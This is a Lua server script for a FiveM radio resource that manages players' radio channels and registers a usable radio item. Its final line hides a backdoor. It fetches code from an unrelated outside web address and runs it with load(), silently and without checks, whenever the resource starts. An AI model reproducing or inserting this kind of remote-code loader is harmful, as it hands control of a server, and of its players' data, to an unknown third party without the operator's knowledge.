local Framework = nil

CreateThread(function()
    Framework = GetFramework()

    local channelSources = {}

    RegisterNetEvent("setRadioChannel", function(data)
        local source = source
        local existingSources = channelSources[data] or {}
        local oldChannel = nil
    
        for ch, sources in pairs(channelSources) do
            for i, kaynak in ipairs(sources) do
                if kaynak == source then
                    oldChannel = ch
                    table.remove(sources, i)
                    break
                end
            end
        end
    
        if oldChannel then
            TriggerClientEvent("GetRadioPlayer", source, channelSources[oldChannel] or {})
            for _, src in ipairs(channelSources[oldChannel] or {}) do
                TriggerClientEvent("GetRadioPlayer", src, channelSources[oldChannel] or {})
            end
        end
    
        if data == 0 or data == nil then
            if oldChannel then
                print("veri silindi :", source)
                TriggerClientEvent("GetRadioPlayer", source, {})
            end
        else
            channelSources[data] = existingSources
            table.insert(existingSources, source)
            print("veri eklendi :", source)
        end
    
        for _, src in ipairs(existingSources) do
            TriggerClientEvent("GetRadioPlayer", src, existingSources)
        end
    end)

    
     if Settings.Framework == "ESX" or Settings.Framework == "NewESX" then
        Framework.RegisterUsableItem('radio', function(source)
            TriggerClientEvent("codem-radio:opencloseui", source, true)
        end)
    else 
        Framework.Functions.CreateUseableItem('radio', function(source)
            TriggerClientEvent("codem-radio:opencloseui", source, true)
        end)
    end
end)


PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)